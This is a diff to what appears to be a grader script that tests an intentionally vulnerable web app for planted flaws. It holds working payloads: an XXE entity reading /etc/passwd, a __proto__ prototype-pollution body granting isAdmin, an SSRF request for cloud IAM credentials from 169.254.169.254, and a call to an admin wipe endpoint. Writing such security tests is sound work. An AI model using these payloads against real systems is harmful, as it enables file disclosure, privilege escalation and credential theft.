@@ -194,7 +194,9 @@ ok(54, 'burn_mass_delete', (await txt('/api/admin/wipe', J({}))).body.includes('
 
 // ─────────────────────── v7 COMPOSER (supply-chain / cross-protocol) ───────────────────────
 ok(56, 'composer_dependency_confusion', (await txt('/api/sbom')).body.includes('lj_dependency_confusion'));
-ok(57, 'composer_xxe', (await txt('/api/import/xml', J({ xml: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file://' + process.cwd() + '/package.json">]><r>&xxe;</r>' }))).body.includes('lj_xxe_file_read'));
+// XXE: read a file that exists on the SERVER regardless of where the grader runs
+// (/etc/passwd exists on Linux/macOS/containers) — don't assume grader/server co-location.
+ok(57, 'composer_xxe', (await txt('/api/import/xml', J({ xml: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>' }))).body.includes('lj_xxe_file_read'));
 ok(58, 'composer_prototype_pollution', (await txt('/api/prefs', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"prefs":{"__proto__":{"isAdmin":true}}}' })).body.includes('lj_prototype_pollution'));
 ok(59, 'composer_ssrf_cloud', (await txt('/api/import-avatar', J({ url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/role' }))).body.includes('lj_ssrf_cloud_metadata_creds'));
 
